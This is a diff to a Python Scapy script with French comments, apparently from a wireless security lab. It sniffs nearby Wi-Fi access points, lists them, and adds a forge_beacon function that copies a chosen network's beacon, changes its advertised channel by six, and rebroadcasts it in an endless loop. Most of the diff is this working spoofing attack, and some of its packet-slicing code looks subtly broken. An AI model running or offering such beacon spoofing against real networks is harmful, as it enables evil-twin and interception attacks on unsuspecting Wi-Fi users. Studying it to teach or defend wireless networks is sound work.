@@ -4,6 +4,7 @@
 #              pour forger un beacon similaire (différence de channel de 6 canaux)
 # Source     : https://pypi.org/project/texttable/
 #              https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy
+#              https://www.binarytides.com/python-packet-sniffer-code-linux/
 
 
 from scapy.all import *
@@ -20,7 +21,7 @@ def display_texttable(list):
     table.set_deco(text_t.Texttable.HEADER)
     table.set_cols_dtype(['i','t','t','t','t']) 
     table.set_cols_align(["l", "l", "l", "l", "l"])
-    table.add_row(["N°", "BSSID", "SSID", "Channel", "Strength"])
+    table.add_row(["No", "BSSID", "SSID", "Channel", "Strength"])
 
     i = 0
     for info in list:
@@ -59,8 +60,34 @@ def SSID_finder(pkt):
                 pkt_list.append(pkt)
                 ap_list.append([pkt.getlayer(Dot11).addr2, ssid, channel, rssi])
 
-            
+
+# Forge un faux beacon ayant un canal différent (6 de différence)
+def forge_beacon(pkt):
+    NB_CHANNELS = 13
+    #check que la trame est de type "beacon"
+    if pkt.haslayer(Dot11Beacon):
+        #type doit être 0 et subtype 8 obligatoirement
+        if pkt.type == 0 and pkt.subtype == 8:
+            beacon = pkt
+            #nouveau canal (avec 6 de différence)
+            #on utilise le modulo 13 pour ne choisir que parmis les 13 canaux disponibles
+            channel = ((int.from_bytes(pkt[Dot11Elt][2].info, byteorder='big')+ 5) % NB_CHANNELS) + 1
+            #création d'un nouveau paquet en ne prenant uniquement la fin de dernier
+            #le reste des layers ne nous sert pas car ils seront supprimé avec l'envoi du nouveau beacon
+            pkt_part = beacon[Dot11Elt][3]
+            #changement du canal
+            beacon[Dot11Elt:3] = Dot11Elt(ID="DSset", len=len(channel.to_bytes(1, 'big')), info=(channel.to_bytes(1, 'big')))
+            #on ajoute la fin du paquet que l'on a modifié
+            beacon_send = beacon/pkt_part
+            #envoi du nouveau paquet
+            sendp(beacon_send, iface=interface_to_check, loop=1)
+
+
 interface_to_check = input("Nom de l'interface : ")
 print("Interface selectionnée : " + interface_to_check)
 sniff(iface=interface_to_check , prn=SSID_finder, timeout=10)
 display_texttable(ap_list)
+
+SSID_select = input("Numero du SSID à modifier : ")
+print("No choisi : " + SSID_select)
+forge_beacon(pkt_list[int(SSID_select)-1])	
